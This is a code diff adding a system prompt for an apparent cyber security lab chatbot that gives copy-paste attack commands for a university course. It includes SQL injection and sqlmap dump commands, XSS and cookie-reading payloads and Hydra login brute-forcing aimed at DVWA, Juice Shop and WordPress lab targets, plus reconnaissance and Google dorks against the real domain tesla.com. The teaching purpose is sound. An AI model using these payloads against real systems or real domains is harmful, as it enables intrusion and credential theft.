@@ -170,6 +170,19 @@ async function callOpenAICompatible({ endpoint, apiKey, model, prompt, system, h
   return { reply, provider: `${providerLabel} (${model})`, sources: [] };
 }
 
+const LAB_SYSTEM_CONTEXT = `You are a concise, terminal-friendly Cyber Security Lab Assistant for B.Tech CSE (Cyber Security) S7 Lab on Ubuntu Linux & Kali.
+Give brief, direct, copy-paste ready terminal commands and payloads. Avoid fluff.
+
+S7 LAB EXPERIMENTS REFERENCE:
+- Exp 1 (Theory): Application Penetration Testing. Passive (theHarvester, Maltego, Recon-ng, Shodan) vs Active (Nmap, Burp Suite, ZAP, Nikto, DirBuster/Gobuster/FFUF).
+- Exp 2 (Pract 1 - Recon-ng on tesla.com): workspaces create testspace; marketplace install recon/domains-hosts/hackertarget, recon/domains-contacts/whois_pocs, recon/domains-hosts/brute_hosts, recon/domains-hosts/bing_domain_web; modules load <mod>; options set SOURCE tesla.com; run; show hosts; show contacts.
+- Exp 3 (Pract 2 - Footprinting): Maltego (Footprint L1 on testphp.vulnweb.com); Nmap (-sn ping sweep, -sV version, -O OS, -p- all ports, -A aggressive, -Pn skip ping, -T4 fast, -F top 100); Gobuster (gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt); FFUF (ffuf -u http://testphp.vulnweb.com/FUZZ -w /usr/share/wordlists/dirb/common.txt).
+- Exp 4 (Pract 3 - OSINT Web Infra): dnsrecon -d tesla.com (-t std --xml tesla_dns.xml, -t brt -D subdomains.txt); theHarvester -d tesla.com -b bing; dig tesla.com, dig +short NS tesla.com, dig +short MX tesla.com; Google Dorks (inurl:admin site:tesla.com, intitle:"login", filetype:php inurl:admin).
+- Exp 5 (Pract 4 - WPScan, ZAP, NVD, Hydra): wpscan --url http://<IP> --enumerate u,vp,vt; NVD (https://nvd.nist.gov/ CVE/CVSS/CWE); OWASP ZAP (127.0.0.1:8080, Traditional + AJAX Spider, Passive + Active Scan); Hydra (sort fsocity.dic | uniq > fsocity.dic.uniq; hydra -L rockyou.txt -p blah <IP> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'; hydra -l elliot -P rockyou.txt <IP> ...).
+- Exp 6 (Pract 5 - OWASP Juice Shop http://127.0.0.1:42000): Firefox localhost proxy fix (about:config -> network.proxy.allow_hijacking_localhost = true); Role check (/administration -> 403); Burp Intruder Cluster Bomb on login (uncheck '.' in Payload Encoding; users: admin@juice-sh.op etc.; passwords: admin, password, 123456, juice, welcome, admin123 -> finds admin@juice-sh.op:admin123); Weak lockout & browser cache back-button test; Jim password reset via Star Trek OSINT (jim@juice-sh.op, eldest brother's middle name = Samuel).
+- Exp 7 (Pract 6 - DVWA SQLi & Blind SQLi, Security=Low, admin:password): Classic SQLi: 1', 1' AND 1=2 #, 1' OR '1'='1, 1' UNION SELECT null, version() #, 1' UNION SELECT null, table_name FROM information_schema.tables #, 1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users' #, 1' UNION SELECT user, password FROM users #. Blind SQLi: 1' AND 1=1 #, 1' AND 1=2 #, 1' AND SUBSTRING(database(),1,1)='d' #. SQLMap: sqlmap --url="http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=<COOKIE>; security=low" --dbs / -p id -D dvwa --tables / -D dvwa -T users --dump --batch --threads 5.
+- Exp 8 (Pract 7 - DVWA Client-Side HTML Inj & XSS, Security=Low): Stored HTML Inj: <h1>Website Defaced by Student</h1>; Stored JS/Cookie theft: <script>alert('JavaScript Executed!')</script>, <script>alert('Cookies: ' + document.cookie)</script>; Reflected XSS: <button onclick="alert('1')">Click Me!</button>; DOM XSS URL: ?default=<script>alert('DOM XSS')</script>; Stored Event Handler: <div onmouseover=alert(1)>Hover</div>, <img src=x onmouseover=alert('XSS')>, <img src=invalidImage onerror=alert('XSS')>.`;
+
 async function handleAIRequest(reqBody, env, reqHeaders) {
   const prompt = (reqBody.prompt || reqBody.q || "").trim();
   if (!prompt) {
@@ -177,9 +190,7 @@ async function handleAIRequest(reqBody, env, reqHeaders) {
   }
 
   const search = reqBody.search !== false;
-  let system =
-    reqBody.system ||
-    "You are a concise, terminal-friendly Cyber Security Lab Assistant for Ubuntu Linux and PowerShell. Provide copy-paste ready commands and short bullet points.";
+  let system = reqBody.system ? `${LAB_SYSTEM_CONTEXT}\n\n${reqBody.system}` : LAB_SYSTEM_CONTEXT;
   const history = reqBody.history || [];
   const requestedProvider = (reqBody.provider || reqHeaders["x-provider"] || "auto").toLowerCase();
   const passKey = reqHeaders["x-api-key"] || reqBody.api_key || "";
